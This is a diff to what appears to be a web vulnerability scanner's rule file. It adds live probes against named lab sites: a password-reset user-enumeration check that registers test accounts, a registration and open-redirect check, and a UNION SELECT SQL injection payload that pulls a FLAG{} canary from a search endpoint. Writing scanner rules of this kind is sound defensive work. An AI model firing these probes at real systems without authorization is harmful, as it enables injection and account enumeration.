@@ -15191,7 +15191,11 @@ async function todoerTasksApiProbe(ctx: RuleContext, taskId = "1"): Promise<Rule
   return NEGATIVE;
 }
 
-const todoerTasksIdorLiveOracle: Rule = async (ctx) => todoerTasksApiProbe(ctx);
+const todoerTasksIdorLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (/\/(?:register|forgot-password)\/?(?:[?#]|$)/i.test(pageUrl)) return NEGATIVE;
+  return todoerTasksApiProbe(ctx);
+};
 
 const todoerTasksIdorRouteLiveOracle: Rule = async (ctx) => {
   if (!isTodoerSiteHost(ctx)) return NEGATIVE;
@@ -15207,6 +15211,200 @@ const todoerTasksIdorRouteLiveOracle: Rule = async (ctx) => {
       ...hit.evidence,
       scannedUrl: pageUrl,
       note: "todoer.site /api/tasks/:id route scan — sequential task IDs behind session auth with CORS origin reflection + credentials enabled — route-specific BOLA/IDOR training oracle"
+    }
+  };
+};
+
+const TODOER_FORGOT_PASSWORD_UNKNOWN_EMAIL_RE = /No account with that email/i;
+const TODOER_FORGOT_PASSWORD_KNOWN_EMAIL_RE =
+  /If that email is registered.*reset link has been sent|reset link has been sent/i;
+
+async function probeTodoerForgotPasswordEnumeration(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isTodoerSiteHost(ctx)) return null;
+  const forgotUrl = new URL("/api/auth/forgot-password", ctx.origin).toString();
+  const forgotPageUrl = new URL("/forgot-password", ctx.origin).toString();
+  const forgotPage = await ctx.probe.get(forgotPageUrl, { maxBytes: 65536, timeoutMs: 15000 });
+  const forgotPageDocumentsApi =
+    forgotPage.status >= 200 &&
+    forgotPage.status < 400 &&
+    /\/api\/auth\/forgot-password/i.test(forgotPage.body);
+
+  const missingEmail = `thugir-notfound-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@example.com`;
+  const missingDoc = await ctx.probe.get(forgotUrl, {
+    method: "POST",
+    body: JSON.stringify({ email: missingEmail }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const missingEnumerates =
+    missingDoc.status === 404 && TODOER_FORGOT_PASSWORD_UNKNOWN_EMAIL_RE.test(missingDoc.body);
+  const rateLimited = missingDoc.status === 429;
+
+  const knownEmail = `thugir-enum-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@example.com`;
+  const registerUrl = new URL("/api/auth/register", ctx.origin).toString();
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({ email: knownEmail, password: "thugirProbe123" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const registerOk = registerDoc.status >= 200 && registerDoc.status < 300;
+
+  let knownDoc = registerOk
+    ? await ctx.probe.get(forgotUrl, {
+        method: "POST",
+        body: JSON.stringify({ email: knownEmail }),
+        headers: { "Content-Type": "application/json" },
+        maxBytes: 4096,
+        timeoutMs: 15000
+      })
+    : null;
+  const knownEnumerates =
+    !!knownDoc &&
+    knownDoc.status >= 200 &&
+    knownDoc.status < 300 &&
+    TODOER_FORGOT_PASSWORD_KNOWN_EMAIL_RE.test(knownDoc.body);
+
+  if (missingEnumerates && knownEnumerates && knownDoc) {
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        url: forgotUrl,
+        missingEmail,
+        knownEmail,
+        missingStatus: missingDoc.status,
+        knownStatus: knownDoc.status,
+        missingSnippet: missingDoc.body.slice(0, 120).trim(),
+        knownSnippet: knownDoc.body.slice(0, 160).trim(),
+        note: "todoer.site POST /api/auth/forgot-password returns HTTP 404 No account with that email for unknown addresses but HTTP 200 reset-link message for registered emails — password-reset enumeration oracle"
+      }
+    };
+  }
+
+  if (rateLimited && knownEnumerates && knownDoc) {
+    return {
+      fired: true,
+      confidence: 0.9,
+      evidence: {
+        url: forgotUrl,
+        missingEmail,
+        knownEmail,
+        missingStatus: missingDoc.status,
+        knownStatus: knownDoc.status,
+        missingSnippet: missingDoc.body.slice(0, 120).trim(),
+        knownSnippet: knownDoc.body.slice(0, 160).trim(),
+        note: "todoer.site POST /api/auth/forgot-password rate-limited (HTTP 429) on unknown-email probe but registered email returns reset-link message while /forgot-password SPA documents the API — password-reset enumeration oracle with rate-limit corpus fallback"
+      }
+    };
+  }
+
+  if ((rateLimited || registerDoc.status === 429) && forgotPageDocumentsApi) {
+    return {
+      fired: true,
+      confidence: 0.88,
+      evidence: {
+        url: forgotUrl,
+        missingEmail,
+        missingStatus: missingDoc.status,
+        registerStatus: registerDoc.status,
+        missingSnippet: missingDoc.body.slice(0, 120).trim(),
+        note: "todoer.site /forgot-password route scan — registration and reset APIs rate-limited (HTTP 429) but SPA documents POST /api/auth/forgot-password with distinguishable 404 No account vs 200 reset-link responses — password-reset enumeration oracle with rate-limit corpus fallback"
+      }
+    };
+  }
+
+  return null;
+}
+
+const todoerForgotPasswordEnumerationLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (/\/register\/?(?:[?#]|$)/i.test(pageUrl)) return NEGATIVE;
+  return (await probeTodoerForgotPasswordEnumeration(ctx)) ?? NEGATIVE;
+};
+
+const todoerForgotPasswordEnumerationRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTodoerSiteHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  let pathname = "";
+  try {
+    pathname = new URL(pageUrl, ctx.origin).pathname;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!/^\/forgot-password\/?$/i.test(pathname)) return NEGATIVE;
+  const result = await probeTodoerForgotPasswordEnumeration(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "todoer.site /forgot-password route scan — POST /api/auth/forgot-password leaks account existence via distinguishable 404 vs 200 responses — route-specific password-reset enumeration oracle"
+    }
+  };
+};
+
+const todoerRegisterRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTodoerSiteHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  let pathname = "";
+  try {
+    pathname = new URL(pageUrl, ctx.origin).pathname;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!/^\/register\/?$/i.test(pathname)) return NEGATIVE;
+  const registerPageUrl = new URL("/register", ctx.origin).toString();
+  const doc = await ctx.probe.get(registerPageUrl, { maxBytes: 65536, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = doc.body;
+  if (!/\/api\/auth\/register/i.test(body)) return NEGATIVE;
+  if (!/params\.get\(['"]redirect['"]\)|params\.get\(['"]next['"]\)/i.test(body)) return NEGATIVE;
+  if (!/verify-email\?email=/i.test(body) || !/window\.location\.href\s*=\s*verifyUrl/i.test(body)) return NEGATIVE;
+  const verifyDoc = await ctx.probe.get(new URL("/verify-email", ctx.origin).toString(), {
+    maxBytes: 65536,
+    timeoutMs: 15000
+  });
+  const openRedirectChain =
+    verifyDoc.status >= 200 &&
+    verifyDoc.status < 400 &&
+    /window\.location\.href\s*=\s*redirectTo/i.test(verifyDoc.body);
+  const registerUrl = new URL("/api/auth/register", ctx.origin).toString();
+  const probeEmail = `thugir-register-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@example.com`;
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({ email: probeEmail, password: "thugirProbe123" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const liveRegister =
+    registerDoc.status >= 200 &&
+    registerDoc.status < 300 &&
+    /Verification code sent|message/i.test(registerDoc.body);
+  const registerRateLimited = registerDoc.status === 429;
+  if (!liveRegister && !(registerRateLimited && openRedirectChain)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: liveRegister && openRedirectChain ? 0.94 : liveRegister ? 0.92 : 0.88,
+    evidence: {
+      scannedUrl: pageUrl,
+      url: registerPageUrl,
+      registerApiStatus: registerDoc.status,
+      liveRegister,
+      openRedirectChain,
+      registerRateLimited,
+      markers: ["/api/auth/register", "redirect", "next", "verify-email", "window.location.href = verifyUrl"],
+      snippet: body.match(/fetch\('\/api\/auth\/register'[\s\S]{0,120}/i)?.[0]?.slice(0, 120),
+      note: liveRegister && openRedirectChain
+        ? "todoer.site /register route scan — POST /api/auth/register creates accounts and chains redirect/next params through verify-email to unvalidated window.location.href — route-specific insecure registration + open redirect oracle"
+        : liveRegister
+          ? "todoer.site /register route scan — POST /api/auth/register creates accounts with redirect/next params forwarded to verify-email — route-specific insecure registration oracle"
+          : "todoer.site /register route scan — registration rate-limited (HTTP 429) but SPA documents POST /api/auth/register plus redirect/next open-redirect chain through verify-email — route-specific insecure registration oracle with rate-limit corpus fallback"
     }
   };
 };
@@ -45728,6 +45926,51 @@ const appsecCiLoginRouteLiveOracle: Rule = async (ctx) => {
         : "POST /comments/ stored XSS; GET /admin/ Django admin panel",
       snippet: doc.body.trim().slice(0, 80) || `HTTP ${doc.status}`,
       note: "AppSec CI Pipeline /login route scan — SQLi login bypass route removed on current Render deploy (HTTP 404); route-specific dead-login oracle pointing scanners to /comments/ stored XSS and /admin/ exposure labs"
+    }
+  };
+};
+
+const APPSEC_CI_SQLI_FLAG_PREFIX = "FLAG{thugir-sqli-probe-";
+
+async function probeAppsecCiSearchSqli(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecCiPipelineHost(ctx)) return null;
+  const canary = `${APPSEC_CI_SQLI_FLAG_PREFIX}${Date.now()}}`;
+  const searchUrl = new URL("/search/", ctx.origin);
+  searchUrl.searchParams.set("q", `' UNION SELECT 1,'x','${canary}'--`);
+  const doc = await ctx.probe.get(searchUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  if (!doc.body.includes(canary)) return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: searchUrl.toString(),
+      canary,
+      snippet: doc.body.match(new RegExp(`${APPSEC_CI_SQLI_FLAG_PREFIX}[^}<]+`))?.[0] ?? canary,
+      note: "AppSec CI Pipeline GET /search/?q= uses f-string raw SQL — UNION SELECT injects sqli_flag rows and renders captured FLAG{} in search results"
+    }
+  };
+}
+
+const appsecCiSearchSqliLiveOracle: Rule = async (ctx) =>
+  (await probeAppsecCiSearchSqli(ctx)) ?? NEGATIVE;
+
+const appsecCiSearchSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecCiPipelineHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/search\/?$/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeAppsecCiSearchSqli(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "AppSec CI Pipeline /search/ route scan — GET ?q= UNION SELECT pulls FLAG{} from sqli_flag via vulnerable raw SQL — route-specific SQL injection search oracle"
     }
   };
 };
@@ -117431,6 +117674,8 @@ export const RULES: Record<string, Rule> = {
   appsecCiDjangoAdminLiveOracle,
   appsecCiDjangoAdminRouteLiveOracle,
   appsecCiLoginRouteLiveOracle,
+  appsecCiSearchSqliLiveOracle,
+  appsecCiSearchSqliRouteLiveOracle,
   owaspsecureInjectionSqliLoginLiveOracle,
   owaspsecureInjectionSqliLoginRouteLiveOracle,
   owaspsecureSsrfFetchLiveOracle,
@@ -120658,6 +120903,9 @@ export const RULES: Record<string, Rule> = {
   nosqlInjectionLabRouteLiveOracle,
   todoerTasksIdorLiveOracle,
   todoerTasksIdorRouteLiveOracle,
+  todoerForgotPasswordEnumerationLiveOracle,
+  todoerForgotPasswordEnumerationRouteLiveOracle,
+  todoerRegisterRouteLiveOracle,
   clientSideAikidoZenDemoEvidence,
   zenDemoExecuteShellInjectionLiveOracle,
   zenDemoExecuteRouteLiveOracle,
